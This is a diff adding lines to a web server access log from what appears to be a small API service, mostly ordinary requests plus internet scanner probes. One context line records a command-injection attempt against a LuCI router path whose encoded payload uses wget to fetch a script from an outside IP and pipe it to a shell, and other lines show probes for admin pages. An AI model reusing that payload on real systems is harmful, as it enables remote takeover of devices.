@@ -9532,3 +9532,10 @@
 192.168.0.100:36846 - "GET /openapi.json HTTP/1.1" 200
 185.224.128.84:34656 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.171%2Ft%7Csh%3B%60) HTTP/1.1" 404
 192.168.0.100:42914 - "GET /populate-database?concurrency_limit=5&timeout=120&max_images=50&max_price=2500 HTTP/1.1" 200
+45.148.10.251:42318 - "GET /cgi-bin/luci/%3Bstok%3D/locale HTTP/1.1" 404
+12.208.125.142:56472 - "GET /manager/html HTTP/1.1" 404
+192.168.0.100:50270 - "GET /%24 HTTP/1.1" 404
+192.168.0.100:50276 - "GET /favicon.ico HTTP/1.1" 404
+192.168.0.100:39980 - "GET /%24 HTTP/1.1" 404
+192.168.0.100:39980 - "GET /3ds1633693954432212 HTTP/1.1" 404
+192.168.0.100:57958 - "GET /populate-database?concurrency_limit=5&timeout=120&max_images=50&max_price=2500 HTTP/1.1" 200
